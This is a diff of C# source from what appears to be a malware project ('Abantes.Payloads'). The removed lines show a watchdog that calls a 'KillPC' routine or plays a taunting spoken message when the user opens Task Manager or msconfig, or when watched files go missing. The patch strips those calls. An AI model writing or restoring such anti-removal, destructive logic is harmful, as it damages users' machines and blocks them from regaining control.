@@ -99,7 +99,7 @@ namespace Abantes.Payloads
             while (true)
             {
                 Thread.Sleep(1000);
-                WatchDog.ProcessWatchDog(MustRun, NeverRun);
+                WatchDog.ProcessWatchDog(NeverRun, MustRun);
             }
         }
     }
@@ -285,37 +285,31 @@ namespace Abantes.Payloads
         {
             //Put each files path in an array to check if it exists
 
-            for (int i = 0; i < sFileName.Count();i++)
+            for (int i = 0; i < sFileName.Count(); i++)
             {
                 if (File.Exists(sFileName[i]) == false)
                 {
-                    Destructive.KillPC();
+
                 }
             }
         }
-        public static void ProcessWatchDog(string[] sMustRun, string[] sNeverRun)
+        public static void ProcessWatchDog(string[] sNeverRun, string[] sMustRun)
         {
             //Put each process to watch for in an array to check if it exists
-            
-            for (int i = 0; i < sMustRun.Count(); i++)
+
+            for (int i = 0; i < sNeverRun.Count(); i++)
             {
-                
-                Process[] proc = Process.GetProcessesByName(sMustRun[i]);
+                Process[] proc = Process.GetProcessesByName(sNeverRun[i]);
                 if (proc.Length > 0)
                 {
-                    
+
                     if (proc[0].ToString() == Process.GetProcessesByName("taskmgr")[0].ToString())
                     {
                         //Flagged
-                        SpeechSynthesizer TTS = new SpeechSynthesizer();
-                        TTS.SetOutputToDefaultAudioDevice();
-                        TTS.Volume = 100;
-                        TTS.Speak("There Is No Way Out");
                     }
                     else if (proc[0].ToString() == Process.GetProcessesByName("msconfig")[0].ToString())
                     {
                         //Flagged
-                        Destructive.KillPC();
                     }
                     else
                     {
@@ -324,17 +318,16 @@ namespace Abantes.Payloads
                 }
             }
 
-            for (int i = 0; i < sNeverRun.Count(); i++)
+            for (int i = 0; i < sMustRun.Count(); i++)
             {
                 Process[] proc = Process.GetProcessesByName(sMustRun[i]);
                 if (proc.Length == 0)
                 {
-                    //Running
+                    //Not Running
                 }
                 else
                 {
-                    //Not Running
-                    Destructive.KillPC();
+                    //Running
                 }
             }
         }
